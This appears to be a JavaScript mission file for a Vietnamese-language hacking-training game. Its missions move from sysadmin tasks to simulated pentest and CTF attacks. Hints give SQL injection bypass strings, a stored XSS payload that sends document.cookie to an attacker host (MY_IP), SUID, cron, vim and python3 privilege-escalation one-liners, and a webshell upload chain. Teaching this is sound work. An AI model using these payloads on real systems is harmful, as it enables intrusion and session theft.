import fsMission1 from './filesystems/chapter1-mission1.js';
import fsMission2 from './filesystems/chapter1-mission2.js';
import fsMission3 from './filesystems/chapter1-mission3.js';
import fsC2M1 from './filesystems/chapter2-mission1.js';
import fsC2M2 from './filesystems/chapter2-mission2.js';
import fsC2M3 from './filesystems/chapter2-mission3.js';
import fsC3M1 from './filesystems/chapter3-mission1.js';
import fsC3M2 from './filesystems/chapter3-mission2.js';
import fsC3M3 from './filesystems/chapter3-mission3.js';
import fsC4M1 from './filesystems/chapter4-mission1.js';
import fsC4M2 from './filesystems/chapter4-mission2.js';
import fsC4M3 from './filesystems/chapter4-mission3.js';
import fsC5M1 from './filesystems/chapter5-mission1.js';
import fsC5M2 from './filesystems/chapter5-mission2.js';
import fsC5M3 from './filesystems/chapter5-mission3.js';
import fsC6M1 from './filesystems/chapter6-mission1.js';
import fsC6M2 from './filesystems/chapter6-mission2.js';
import fsC6M3 from './filesystems/chapter6-mission3.js';
import fsC7M1 from './filesystems/chapter7-mission1.js';
import fsC7M2 from './filesystems/chapter7-mission2.js';
import fsC7M3 from './filesystems/chapter7-mission3.js';
import fsC8M1 from './filesystems/chapter8-mission1.js';
import fsC8M2 from './filesystems/chapter8-mission2.js';
import fsC8M3 from './filesystems/chapter8-mission3.js';
import fsC9M1 from './filesystems/chapter9-mission1.js';
import fsC9M2 from './filesystems/chapter9-mission2.js';
import fsC9M3 from './filesystems/chapter9-mission3.js';
import fsC10M1 from './filesystems/chapter10-mission1.js';
import fsC10M2 from './filesystems/chapter10-mission2.js';
import fsC10M3 from './filesystems/chapter10-mission3.js';

// Mỗi step có:
//   - description: hiển thị trong checklist
//   - match: RegExp nhận diện lệnh đúng của step (đã chuẩn hoá khoảng trắng)
//   - output (tuỳ chọn): output "đóng hộp" cho lệnh KHÔNG thao tác file thật (ps, nmap, ssh...).
//     Bỏ trống nếu lệnh là file-based -> localShell tự sinh output thật từ filesystem giả.

const PS_AUX = [
  'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND',
  'root         1  0.0  0.1 168120  9000 ?       Ss   02:00   0:01 /sbin/init',
  'www-data  6713 99.2  0.5  72340 21000 ?       R    03:02  18:43 /tmp/miner',
  'root       820  0.1  0.2 110200 12400 ?       Ss   02:00   0:02 /usr/sbin/sshd',
  'postgres   910  0.3  1.1 402000 45000 ?       S    02:01   0:05 postgres',
].join('\n');

export const missions = {
  1: [
    {
      id: 1,
      chapterId: 1,
      title: 'Báo động lúc 3 giờ sáng',
      story:
        'Điện thoại mày rung lúc 3 giờ sáng. Server báo lỗi. Mày SSH vào, không có gì trên màn hình ngoài terminal. Tìm file log trong /var/log/ và đọc 50 dòng cuối để biết chuyện gì đã xảy ra.',
      steps: [
        { id: 'navigate', description: 'Vào thư mục /var/log', match: /^cd\s+\/var\/log\/?$/ },
        { id: 'list', description: 'Liệt kê các file log có trong đó', match: /^ls(\s|$)/ },
        { id: 'tail', description: 'Đọc 50 dòng cuối của file log để tìm lỗi', match: /^tail\b.*(syslog|production\.log)/ },
      ],
      hints: [
        'Mày cần xem các file trong /var/log/ trước khi đọc nội dung.',
        'Dùng `cd /var/log` rồi `ls` để xem có file gì.',
        'Gõ `tail -n 50 syslog` hoặc `tail -n 50 app/production.log` để xem 50 dòng cuối.',
      ],
      initialFilesystem: fsMission1,
    },
    {
      id: 2,
      chapterId: 1,
      title: 'Config biến mất',
      story:
        'Đồng nghiệp report là sau một lần dọn dẹp, có file config quan trọng biến mất. Mày phải tìm tất cả file `.conf` còn lại trong hệ thống để xác minh.',
      steps: [
        { id: 'find_conf', description: 'Tìm tất cả file .conf trong toàn hệ thống', match: /^find\s+\/.*-name.*\.conf/ },
        { id: 'review', description: 'Xem nội dung ít nhất một file .conf tìm được', match: /^cat\s+\S*\.conf/ },
      ],
      hints: [
        'Mày cần search toàn bộ filesystem theo phần mở rộng file.',
        'Dùng `find / -name "*.conf"` để tìm tất cả file .conf.',
        'Gõ `find / -name "*.conf"` rồi `cat <đường-dẫn-tìm-được>` để xem nội dung.',
      ],
      initialFilesystem: fsMission2,
    },
    {
      id: 3,
      chapterId: 1,
      title: 'Lọc lỗi, lưu báo cáo',
      story:
        'Sếp muốn một báo cáo riêng chỉ chứa các dòng lỗi từ log API. Mày phải filter ra tất cả dòng có chữ "ERROR" và lưu kết quả vào một file mới.',
      steps: [
        { id: 'grep_error', description: 'Tìm tất cả dòng chứa "ERROR" trong /var/log/api.log', match: /^grep\b.*ERROR.*api\.log\s*$/ },
        { id: 'redirect', description: 'Lưu kết quả filter vào một file riêng (ví dụ errors.log)', match: /^grep\b.*ERROR.*api\.log\s*>>?\s*\S+/ },
      ],
      hints: [
        'Mày cần lọc dòng theo từ khóa rồi lưu output ra file khác.',
        'Dùng `grep "ERROR" /var/log/api.log` để lọc dòng lỗi.',
        'Gõ `grep "ERROR" /var/log/api.log > errors.log` để lưu kết quả ra file errors.log.',
      ],
      initialFilesystem: fsMission3,
    },
  ],
  2: [
    {
      id: 1,
      chapterId: 2,
      title: 'Thứ gì đang ăn CPU',
      story:
        'Server chậm như rùa, load average leo lên 8. Sếp sắp vào họp với khách. Mày phải tìm process nào đang ngốn CPU nhiều nhất và kill nó ngay trước khi sếp phát hiện.',
      steps: [
        { id: 'list_proc', description: 'Liệt kê các process đang chạy và mức dùng CPU', match: /^(ps\b|top\b|htop\b)/, output: PS_AUX },
        { id: 'identify', description: 'Xác định process ngốn CPU nhiều nhất (PID của nó)', match: /^(ps\b|top\b|htop\b)|grep\s+miner|pgrep/, output: 'www-data  6713 99.2  0.5  72340 21000 ?  R  03:02  18:43 /tmp/miner   <-- 99% CPU, runaway process (PID 6713)' },
        { id: 'kill', description: 'Kill process đó', match: /^(kill|pkill|killall)\b.*(6713|miner)/, output: '[1]+  Killed                 /tmp/miner' },
      ],
      hints: [
        'Mày cần xem process nào đang chạy và ngốn tài nguyên trước đã.',
        'Dùng `ps aux` (hoặc `top`) rồi để ý cột %CPU, tìm thằng cao bất thường.',
        'Tìm PID của process lạ rồi gõ `kill -9 <PID>`, ví dụ `kill -9 6713`.',
      ],
      initialFilesystem: fsC2M1,
    },
    {
      id: 2,
      chapterId: 2,
      title: 'Service ngã ngựa',
      story:
        'Nginx vừa crash, web production tắt ngúm. Mày phải restart nó và set auto-start khi boot để lần sau server reboot là service tự lên, không phải dậy giữa đêm nữa.',
      steps: [
        {
          id: 'check_status',
          description: 'Kiểm tra trạng thái của service đang lỗi',
          match: /^systemctl\s+status\s+nginx/,
          output: [
            '● nginx.service - nginx web server',
            '   Loaded: loaded (/etc/systemd/system/nginx.service; disabled; vendor preset: enabled)',
            '   Active: failed (Result: exit-code) since 03:10 ; 3min ago',
            '  Process: 1123 ExecStart=/usr/sbin/nginx -g "daemon off;" (code=exited, status=1/FAILURE)',
            '   nginx: bind() to 0.0.0.0:80 failed (98: Address already in use)',
          ].join('\n'),
        },
        { id: 'restart', description: 'Restart service cho nó chạy lại', match: /^systemctl\s+(restart|start)\s+nginx/, output: 'nginx.service: restarted. Active: active (running).' },
        { id: 'enable', description: 'Set service auto-start khi boot', match: /^systemctl\s+enable\s+nginx/, output: 'Created symlink /etc/systemd/system/multi-user.target.wants/nginx.service → /etc/systemd/system/nginx.service.' },
      ],
      hints: [
        'Mày cần biết service đang ở trạng thái gì trước khi sửa.',
        'Dùng `systemctl status nginx` để xem, rồi `systemctl restart nginx` để khởi động lại.',
        'Gõ `systemctl restart nginx` rồi `systemctl enable nginx` để bật auto-start khi boot.',
      ],
      initialFilesystem: fsC2M2,
    },
    {
      id: 3,
      chapterId: 2,
      title: 'Backup tự động lúc 2 giờ sáng',
      story:
        'Tuần trước mất data vì quên backup. Sếp ra lệnh: từ nay backup phải tự chạy. Có sẵn script /opt/scripts/backup.sh — mày phải tạo cron job chạy nó mỗi ngày lúc 2 giờ sáng.',
      steps: [
        { id: 'open_cron', description: 'Mở crontab để chỉnh sửa', match: /^crontab\s+-e/, output: '# (opens crontab in the editor — add the cron line and save)' },
        { id: 'add_job', description: 'Thêm dòng cron chạy backup.sh lúc 2h sáng mỗi ngày', match: /0\s+2\s+\*\s+\*\s+\*.*backup\.sh/, output: 'crontab: installing new crontab' },
        { id: 'verify', description: 'Kiểm tra lại cron job đã được thêm', match: /^crontab\s+-l/, output: '0 2 * * * /opt/scripts/backup.sh' },
      ],
      hints: [
        'Mày cần một cron job chạy script theo giờ cố định mỗi ngày, không phải chạy 1 lần.',
        'Cron syntax là `phút giờ ngày tháng thứ lệnh`. Dùng `crontab -e` để mở và thêm dòng mới.',
        'Thêm dòng `0 2 * * * /opt/scripts/backup.sh` rồi `crontab -l` để kiểm tra.',
      ],
      initialFilesystem: fsC2M3,
    },
  ],
  3: [
    {
      id: 1,
      chapterId: 3,
      title: 'Port 8080 câm như hến',
      story:
        'Deploy app xong, chạy trên port 8080. Nhưng từ ngoài internet không ai vào được, dù service vẫn sống. Mày phải debug network để tìm xem điểm nghẽn nằm ở đâu.',
      steps: [
        {
          id: 'check_listen',
          description: 'Xem app có đang listen trên port 8080 không và bind vào đâu',
          match: /^(ss|netstat)\b/,
          output: [
            'Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process',
            'tcp   LISTEN 0      511    127.0.0.1:8080       0.0.0.0:*         users:(("nginx",pid=1123))',
            'tcp   LISTEN 0      128    0.0.0.0:22           0.0.0.0:*         users:(("sshd",pid=820))',
          ].join('\n'),
        },
        { id: 'find_cause', description: 'Xác định nguyên nhân không access được từ ngoài', match: /^cat\s+.*app\.conf/ },
      ],
      hints: [
        'Mày cần xem port 8080 đang được mở và bind vào địa chỉ nào.',
        'Dùng `ss -tulpn` hoặc `netstat -tulpn` để xem, để ý cột địa chỉ local.',
        'Để ý nó bind `127.0.0.1:8080` chứ không phải `0.0.0.0:8080` — chỉ localhost mới vào được. Đọc config app (`cat /etc/nginx/sites-enabled/app.conf`).',
      ],
      initialFilesystem: fsC3M1,
    },
    {
      id: 2,
      chapterId: 3,
      title: 'DNS trỏ lạc đường',
      story:
        'Domain shop.acme-corp.com đột nhiên không vào được sau lần đổi DNS hôm qua. IP đúng của server là 203.0.113.42. Mày phải dùng dig để debug và xác định record nào bị trỏ sai.',
      steps: [
        {
          id: 'query_a',
          description: 'Truy vấn A record của domain bằng dig',
          match: /^dig\s+.*shop\.acme-corp\.com(\s+a)?\s*$/i,
          output: [
            '; <<>> DiG 9.18 <<>> shop.acme-corp.com A',
            ';; ANSWER SECTION:',
            'shop.acme-corp.com.  300  IN  A  198.51.100.99',
            ';; Query time: 12 msec',
          ].join('\n'),
        },
        { id: 'compare', description: 'So sánh IP trả về với IP server đúng (203.0.113.42)', match: /^cat\s+.*ticket\.txt/ },
        {
          id: 'identify_record',
          description: 'Xác định record nào đang sai',
          match: /^dig\s+.*shop\.acme-corp\.com\s+cname/i,
          output: [
            '; <<>> DiG 9.18 <<>> shop.acme-corp.com CNAME',
            ';; ANSWER SECTION:',
            'shop.acme-corp.com.  300  IN  CNAME  parking.old-host.net.',
            ';; NOTE: the A record is wrong — a CNAME to parking.old-host.net was inserted (should point to 203.0.113.42)',
          ].join('\n'),
        },
      ],
      hints: [
        'Mày cần truy vấn xem domain hiện đang trỏ về IP nào.',
        'Dùng `dig shop.acme-corp.com A` để xem A record, rồi `cat ticket.txt` để biết IP đúng.',
        'So IP trong ANSWER với 203.0.113.42; nếu lệch là sai. Thử `dig shop.acme-corp.com CNAME` để xem có CNAME nào lạ chen vào không.',
      ],
      initialFilesystem: fsC3M2,
    },
    {
      id: 3,
      chapterId: 3,
      title: 'Traffic lạ gõ cửa',
      story:
        'Log cảnh báo có nhiều kết nối lạ tới port 4444 từ một IP lạ, nghi là C2 beacon. Mày phải dùng tcpdump capture traffic và phân tích xem chuyện gì đang diễn ra.',
      steps: [
        {
          id: 'capture',
          description: 'Dùng tcpdump capture traffic trên port nghi ngờ',
          match: /^tcpdump\b.*4444/,
          output: [
            'tcpdump: listening on eth0, link-type EN10MB',
            '04:20:01.112 IP 198.51.100.7.51234 > 10.0.0.5.4444: Flags [P.], length 17',
            '04:20:06.118 IP 198.51.100.7.51234 > 10.0.0.5.4444: Flags [P.], length 17',
            '04:20:11.121 IP 198.51.100.7.51234 > 10.0.0.5.4444: Flags [P.], length 17',
            '   (beacon repeats every 5s from 198.51.100.7 — use -A to see payload)',
          ].join('\n'),
        },
        {
          id: 'analyze',
          description: 'Phân tích packet để xác định nguồn và loại traffic',
          match: /^tcpdump\b.*4444.*(-a|-x|-nn)|tcpdump\b.*(-a|-x).*4444/i,
          output: 'Payload: "BEACON id=win10-victim cmd=?" repeating every 5s from 198.51.100.7 -> confirmed C2 beacon; an internal host is compromised.',
        },
      ],
      hints: [
        'Mày cần bắt gói tin trên cổng đang có traffic lạ (port 4444).',
        'Dùng `tcpdump -i eth0 port 4444 -n` để capture, `-n` để không resolve DNS cho nhanh.',
        'Gõ `tcpdump -i eth0 port 4444 -nn -A` để thấy cả nội dung packet, để ý source IP 198.51.100.7 và pattern beacon lặp lại.',
      ],
      initialFilesystem: fsC3M3,
    },
  ],
  4: [
    {
      id: 1,
      chapterId: 4,
      title: 'Khóa cửa bằng SSH key',
      story:
        'Công ty có server mới, policy bảo mật cấm đăng nhập bằng password. Mày phải tạo SSH key, đẩy public key lên server, rồi disable password auth hoàn toàn.',
      steps: [
        {
          id: 'gen_key',
          description: 'Tạo cặp SSH key',
          match: /^ssh-keygen/,
          output: [
            'Generating public/private ed25519 key pair.',
            'Your identification has been saved in /home/hacker/.ssh/id_ed25519',
            'Your public key has been saved in /home/hacker/.ssh/id_ed25519.pub',
            'The key fingerprint is: SHA256:Xa3k9...2pQ hacker@hacklab',
          ].join('\n'),
        },
        { id: 'copy_key', description: 'Copy public key lên server (authorized_keys)', match: /^ssh-copy-id/, output: 'Number of key(s) added: 1. Now try logging into the machine with "ssh deploy@server".' },
        { id: 'disable_pw', description: 'Disable password authentication trong sshd_config', match: /PasswordAuthentication\s+no/, output: 'Set PasswordAuthentication no in /etc/ssh/sshd_config. Run `systemctl restart sshd` to apply.' },
      ],
      hints: [
        'Mày cần một cặp key trước, rồi đẩy public key lên server.',
        'Dùng `ssh-keygen -t ed25519` để tạo key, rồi `ssh-copy-id deploy@server` để đẩy public key.',
        'Sửa `/etc/ssh/sshd_config` đặt `PasswordAuthentication no` rồi `systemctl restart sshd` để áp dụng.',
      ],
      initialFilesystem: fsC4M1,
    },
    {
      id: 2,
      chapterId: 4,
      title: 'Đường hầm tới database',
      story:
        'Database PostgreSQL trên prod chỉ listen 127.0.0.1:5432, không mở ra ngoài. Mày muốn dùng pgAdmin từ máy local thì phải tạo SSH tunnel để forward cổng về.',
      steps: [
        { id: 'build_tunnel', description: 'Tạo SSH local port forward từ máy local tới DB trên server', match: /^ssh\s+.*-L\s*5432:(127\.0\.0\.1|localhost):5432/, output: 'Tunnel established: localhost:5432 -> (via prod) 127.0.0.1:5432. SSH session is holding the tunnel.' },
        { id: 'verify', description: 'Xác nhận có thể kết nối DB qua localhost:5432', match: /(psql|nc|telnet|pg_isready)\b.*(localhost|127\.0\.0\.1).*5432|psql\s+-h\s*(localhost|127)/, output: 'psql (15.3) — connected. localhost:5432 responding -> tunnel works.' },
      ],
      hints: [
        'Mày cần local port forward: cổng local của mày -> 127.0.0.1:5432 trên server.',
        'Flag `-L` của ssh dùng để local forward: `ssh -L <local>:<đích>:<port> user@host`.',
        'Gõ `ssh -L 5432:127.0.0.1:5432 deploy@prod` rồi `psql -h localhost -p 5432` để kiểm tra.',
      ],
      initialFilesystem: fsC4M2,
    },
    {
      id: 3,
      chapterId: 4,
      title: 'Đẩy code lên production',
      story:
        'Cần deploy thư mục code /home/hacker/project lên server production, nhưng không muốn copy lại toàn bộ mỗi lần. Mày phải dùng rsync để sync nhanh, chỉ truyền file thay đổi.',
      steps: [
        {
          id: 'sync',
          description: 'Dùng rsync sync thư mục project lên server prod',
          match: /^rsync\b.*project.*prod/,
          output: [
            'sending incremental file list',
            'project/',
            'project/index.js',
            'project/package.json',
            '',
            'sent 1,204 bytes  received 57 bytes  2,522.00 bytes/sec',
            '(.env is excluded when you use --exclude)',
          ].join('\n'),
        },
        { id: 'verify', description: 'Xác nhận file đã được sync lên đúng đích', match: /(ssh\s+\S*prod\S*\s+ls|ls\s+\/var\/www\/app)/, output: 'index.js  package.json   (now on /var/www/app; .env was not synced)' },
      ],
      hints: [
        'rsync chỉ truyền phần khác biệt nên nhanh hơn scp khi sync lại.',
        'Dùng `rsync -avz ~/project/ deploy@prod:/var/www/app/` — chú ý dấu `/` cuối thư mục nguồn.',
        'Gõ `rsync -avz --exclude ".env" ~/project/ deploy@prod:/var/www/app/` để sync và loại file .env nhạy cảm ra. Kiểm tra: `ssh prod ls /var/www/app`.',
      ],
      initialFilesystem: fsC4M3,
    },
  ],
  5: [
    {
      id: 1,
      chapterId: 5,
      title: 'Soi target từ một địa chỉ IP',
      story:
        'Khách hàng ký hợp đồng pentest, đưa mày đúng một IP: 10.10.14.55. Trước khi tấn công, mày phải biết nó là máy gì — OS nào, mở port nào, chạy service version bao nhiêu.',
      steps: [
        {
          id: 'port_scan',
          description: 'Scan toàn bộ port để biết service nào đang mở',
          match: /^nmap\b/,
          output: [
            'Starting Nmap 7.94 ( https://nmap.org )',
            'Nmap scan report for 10.10.14.55',
            'PORT     STATE SERVICE',
            '22/tcp   open  ssh',
            '80/tcp   open  http',
            '443/tcp  open  https',
            '3306/tcp open  mysql',
          ].join('\n'),
        },
        {
          id: 'version_os',
          description: 'Detect version của service và fingerprint OS',
          match: /^nmap\b.*(-sv|-a|-o)\b/i,
          output: [
            'PORT     STATE SERVICE VERSION',
            '22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu',
            '80/tcp   open  http    Apache httpd 2.4.41',
            '3306/tcp open  mysql   MySQL 5.7.33',
            'OS details: Linux 5.4 (Ubuntu 20.04)',
          ].join('\n'),
        },
      ],
      hints: [
        'Mày cần quét port trước, rồi mới đào sâu version/OS.',
        'Dùng `nmap -p- 10.10.14.55` để quét full port, rồi `-sV` để lấy version.',
        'Gõ `nmap -A -p- 10.10.14.55` (gộp `-sV -O --script default`) để có cả service version lẫn OS guess.',
      ],
      initialFilesystem: fsC5M1,
    },
    {
      id: 2,
      chapterId: 5,
      title: 'Vẽ bản đồ subdomain',
      story:
        'Domain target là acme-corp.com. Bề mặt tấn công thật sự nằm ở các subdomain ẩn — dev, staging, admin... Mày phải enumerate tất cả subdomain trước khi đi tiếp.',
      steps: [
        {
          id: 'passive',
          description: 'Thu thập subdomain passive (subfinder / crt.sh)',
          match: /^(subfinder|amass)\b|crt\.sh/,
          output: [
            'www.acme-corp.com',
            'dev.acme-corp.com',
            'staging.acme-corp.com',
            'admin.acme-corp.com',
            'mail.acme-corp.com',
            'vpn.acme-corp.com',
          ].join('\n'),
        },
        { id: 'consolidate', description: 'Tổng hợp danh sách subdomain tìm được', match: /(subfinder|amass).*-o\s+\S+|cat\s+\S*subs|sort\s+\S*subs/, output: '6 subdomains (sorted, unique): admin, dev, mail, staging, vpn, www .acme-corp.com' },
      ],
      hints: [
        'Bắt đầu bằng passive recon, ít gây ồn và nhanh.',
        'Dùng `subfinder -d acme-corp.com` hoặc check `crt.sh?q=acme-corp.com`.',
        'Gõ `subfinder -d acme-corp.com -o subs.txt` rồi đối chiếu thêm `amass enum -d acme-corp.com` để không sót.',
      ],
      initialFilesystem: fsC5M2,
    },
    {
      id: 3,
      chapterId: 5,
      title: 'Đào thư mục ẩn',
      story:
        'Web server của target nhìn thì trống trơn, nhưng admin hay quên xoá thư mục cũ. Mày phải dùng gobuster brute-force để tìm hidden directory như /backup hay /.git.',
      steps: [
        {
          id: 'dir_brute',
          description: 'Brute-force directory bằng gobuster với wordlist',
          match: /^(gobuster|ffuf|dirb)\b/,
          output: [
            '===============================================================',
            'Gobuster v3.6',
            '===============================================================',
            '/admin                (Status: 301)',
            '/backup               (Status: 200)',
            '/.git                 (Status: 301)',
            '/login                (Status: 200)',
            '/uploads              (Status: 403)',
            '===============================================================',
          ].join('\n'),
        },
        { id: 'inspect', description: 'Kiểm tra directory ẩn tìm được (vd .git, backup)', match: /(cat|ls|git)\b.*(\.git|backup)/ },
      ],
      hints: [
        'Mày cần một wordlist và công cụ fuzz directory.',
        'Dùng `gobuster dir -u http://target -w wordlist.txt`.',
        'Gõ `gobuster dir -u http://target -w /home/hacker/wordlist.txt`; chú ý kết quả `/.git` và `/backup` rồi `cat /var/www/html/.git/config` xem.',
      ],
      initialFilesystem: fsC5M3,
    },
  ],
  6: [
    {
      id: 1,
      chapterId: 6,
      title: 'Cửa sau của login form',
      story:
        'Recon xong, mày thấy login.php nối thẳng input vào câu SQL. Nhiệm vụ: đăng nhập vào tài khoản admin mà không cần biết password — bằng SQL injection.',
      steps: [
        { id: 'find_sqli', description: 'Xác nhận login form dính SQL injection', match: /^cat\s+.*login\.php/ },
        { id: 'bypass', description: 'Bypass authentication, đăng nhập mà không cần password', match: /('|")?\s*or\s+('|")?1('|")?\s*=\s*('|")?1|or\s+1=1|admin'\s*--/i, output: 'Query: ...WHERE username=\'admin\' OR \'1\'=\'1\' -- \'  => returns the admin row. Welcome admin! (logged in without a password)' },
      ],
      hints: [
        'Câu query nối thẳng input, nghĩa là mày có thể chèn điều kiện luôn đúng.',
        'Thử payload làm mệnh đề password luôn true, ví dụ `\' OR \'1\'=\'1`.',
        "Nhập username `admin' -- ` (có dấu cách sau --) để comment phần password đi, hoặc `' OR 1=1 -- ` để bypass.",
      ],
      initialFilesystem: fsC6M1,
    },
    {
      id: 2,
      chapterId: 6,
      title: 'Đánh cắp cookie qua comment',
      story:
        'Trang comments.php echo thẳng nội dung comment ra HTML, không escape. Admin sẽ vào đọc comment. Mày phải inject stored XSS để steal cookie session của admin.',
      steps: [
        { id: 'confirm_xss', description: 'Xác nhận comment section dính stored XSS', match: /^cat\s+.*comments\.php/ },
        { id: 'inject_payload', description: 'Inject payload gửi cookie admin về server của mày', match: /<script>.*document\.cookie|fetch\(.*document\.cookie|onerror=/i, output: 'Comment stored. When the admin opens the page, their browser runs the script and sends the cookie to your listener: PHPSESSID=ad12cef9b... (admin session hijacked).' },
      ],
      hints: [
        'Comment được lưu và render lại cho mọi người -> stored XSS.',
        'Inject thẻ script gửi `document.cookie` về listener của mày.',
        "Post comment: `<script>fetch('http://MY_IP/c?'+document.cookie)</script>` rồi mở listener (vd `nc -lvnp 80`) chờ admin xem.",
      ],
      initialFilesystem: fsC6M2,
    },
    {
      id: 3,
      chapterId: 6,
      title: 'Đọc trộm data qua IDOR',
      story:
        'API có endpoint GET /api/user/{id} nhưng không kiểm tra ownership. Tài khoản mày là id 1002. Mày phải đổi id để đọc trộm data của admin (id 1).',
      steps: [
        { id: 'observe', description: 'Quan sát endpoint trả data theo id trong URL', match: /^cat\s+.*api-docs/ },
        { id: 'exploit_idor', description: 'Đổi id để truy cập data user khác (admin id=1)', match: /(curl|wget|http)\b.*\/api\/user\/1\b/, output: '{"id":1,"username":"admin","role":"superadmin","email":"admin@acme-corp.com","api_key":"sk_live_9fA2..."}  <- read another user\'s data (admin, id=1) via IDOR' },
      ],
      hints: [
        'id nằm thẳng trong URL và server không check chủ sở hữu.',
        'Gửi request tới `/api/user/1` thay vì id của mày.',
        'Gõ `curl -H "Authorization: Bearer <token>" http://target/api/user/1` để đọc data admin.',
      ],
      initialFilesystem: fsC6M3,
    },
  ],
  7: [
    {
      id: 1,
      chapterId: 7,
      title: 'Leo root qua SUID',
      story:
        'Mày đã vào server với user thường. File quan trọng nằm trong /root. Có vài binary mang SUID bit của root — tìm đúng cái và lợi dụng nó để thành root.',
      steps: [
        {
          id: 'enum_suid',
          description: 'Liệt kê các binary có SUID bit',
          match: /find\b.*-perm\b.*4000/,
          output: ['/usr/bin/find', '/usr/bin/passwd', '/usr/bin/sudo', '/bin/mount'].join('\n'),
        },
        { id: 'exploit', description: 'Khai thác SUID binary để lên shell root', match: /find\b.*-exec\b/, output: '# id\nuid=0(root) gid=0(root) groups=0(root)   <- root via SUID find (GTFOBins)' },
        { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/\.flag/ },
      ],
      hints: [
        'Mày cần tìm binary có quyền SUID của root trước.',
        'Dùng `find / -perm -4000 2>/dev/null`; chú ý `/usr/bin/find` trong kết quả.',
        'Tra GTFOBins cho `find`: `find . -exec /bin/sh -p \\; -quit` để có root shell, rồi `cat /root/.flag`.',
      ],
      initialFilesystem: fsC7M1,
    },
    {
      id: 2,
      chapterId: 7,
      title: 'Cướp cron của root',
      story:
        'Root có một cron job chạy /opt/scripts/cleanup.sh mỗi 5 phút. Nhưng script đó world-writable — ai cũng sửa được. Mày inject lệnh vào, đợi cron chạy bằng quyền root.',
      steps: [
        { id: 'find_cron', description: 'Tìm cron job của root chạy script mà mày ghi được', match: /(cat\s+\/etc\/crontab|ls\s+-l.*cleanup\.sh)/ },
        { id: 'inject', description: 'Inject lệnh reverse shell / set SUID vào script', match: /(chmod\s+\+s|cp\s+\/bin\/bash.*\/tmp|>>\s*\/opt\/scripts\/cleanup\.sh|echo.*cleanup\.sh)/, output: 'Payload written to cleanup.sh. Waiting for the root cron (every 5 min)... [5 min later] /tmp/rootbash now has SUID root. Run `/tmp/rootbash -p` for a root shell.' },
        { id: 'read_flag', description: 'Sau khi lên root, đọc flag trong /root', match: /^cat\s+\/root\/\.flag/ },
      ],
      hints: [
        'Xem cron của root và quyền của script nó chạy.',
        'Đọc `/etc/crontab`, kiểm tra `ls -l /opt/scripts/cleanup.sh` -> world-writable.',
        'Append `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash` vào cleanup.sh, đợi cron, chạy `/tmp/rootbash -p` rồi `cat /root/.flag`.',
      ],
      initialFilesystem: fsC7M2,
    },
    {
      id: 3,
      chapterId: 7,
      title: 'Thoát ngục từ vim',
      story:
        'sudoers cho phép mày chạy vim bằng quyền root không cần password. vim không chỉ để sửa file — từ trong nó mày có thể spawn ngay một shell root.',
      steps: [
        {
          id: 'check_sudo',
          description: 'Kiểm tra quyền sudo của mình',
          match: /^sudo\s+-l/,
          output: [
            'Matching Defaults entries for hacker:',
            '    env_reset, secure_path=/usr/sbin:/usr/bin:/sbin:/bin',
            '',
            'User hacker may run the following commands:',
            '    (root) NOPASSWD: /usr/bin/vim',
          ].join('\n'),
        },
        { id: 'escape', description: 'Escape từ vim ra shell root', match: /sudo\s+vim|:!\/bin\/(sh|bash)|:shell|set\s+shell/, output: '# id\nuid=0(root) gid=0(root)   <- spawned /bin/sh from vim (`:!/bin/sh`), now root' },
        { id: 'read_flag', description: 'Đọc flag trong /root', match: /^cat\s+\/root\/\.flag/ },
      ],
      hints: [
        'Xem mình được sudo chạy gì mà không cần password.',
        'Dùng `sudo -l` -> thấy `(root) NOPASSWD: /usr/bin/vim`.',
        'Gõ `sudo vim`, trong vim nhập `:!/bin/sh` (hoặc `:set shell=/bin/sh` rồi `:shell`) để ra root shell, sau đó `cat /root/.flag`.',
      ],
      initialFilesystem: fsC7M3,
    },
  ],
  8: [
    {
      id: 1,
      chapterId: 8,
      title: 'CTF Easy — SQLi tới root',
      story:
        'Bài test đầu tiên: một IP black-box (10.10.10.20). Web app có login dính SQLi, và www-data được sudo chạy python3. Chain hai lỗi lại để chiếm root và lấy flag.',
      steps: [
        { id: 'foothold', description: 'Dùng SQLi để có foothold vào web app', match: /or\s+1=1|('|")?\s*or\s+('|")?1('|")?\s*=\s*('|")?1|admin'\s*--/i, output: 'SQLi OK — login bypassed as admin; www-data shell on 10.10.10.20.' },
        { id: 'privesc', description: 'Leo root qua sudo misconfig (python3)', match: /sudo\s+python3|python3\s+-c.*os\.system|sudo\s+-l/, output: 'sudo python3 -c os.system("/bin/bash") -> uid=0(root). Now root.' },
        { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
      ],
      hints: [
        'Black-box, tự khám phá là chính. Nếu bí: nhìn kỹ form đăng nhập của web app.',
        'Bypass login bằng `\' OR 1=1 -- `, rồi check quyền sudo của user vừa vào được (`sudo -l`).',
        "Privesc: `sudo python3 -c 'import os; os.system(\"/bin/bash\")'` để thành root, rồi `cat /root/flag.txt` -> FLAG{easy_sqli_then_sudo_python3}.",
      ],
      initialFilesystem: fsC8M1,
    },
    {
      id: 2,
      chapterId: 8,
      title: 'CTF Medium — FTP, upload, SUID',
      story:
        'Target 10.10.10.35. FTP cho anonymous login, thư mục upload web ghi được, và có binary nmap mang SUID. Chuỗi: anonymous FTP → upload webshell RCE → SUID nmap lên root → flag.',
      steps: [
        { id: 'ftp_access', description: 'Login FTP anonymous và tìm thư mục upload ghi được', match: /^ftp\b|anonymous/i, output: 'Connected to 10.10.10.35. Anonymous login OK. Found writable /var/www/html/uploads.' },
        { id: 'rce', description: 'Upload webshell, lấy RCE thành www-data', match: /upload|shell\.php|(curl|wget)\b.*uploads/, output: 'shell.php uploaded -> browse http://target/uploads/shell.php?cmd=id -> RCE as www-data.' },
        { id: 'privesc', description: 'Leo root qua SUID binary (nmap)', match: /nmap\s+--interactive|!sh/, output: 'SUID nmap: `nmap --interactive` -> `!sh` -> uid=0(root). Now root.' },
        { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
      ],
      hints: [
        'Black-box, tự khám phá là chính. Nếu bí: thử các service mở port phổ biến trước, có dịch vụ nào cho login không cần mật khẩu không?',
        'Login `ftp 10.10.10.35` (user anonymous), tìm thư mục upload web ghi được, đẩy 1 webshell vào rồi gọi qua web.',
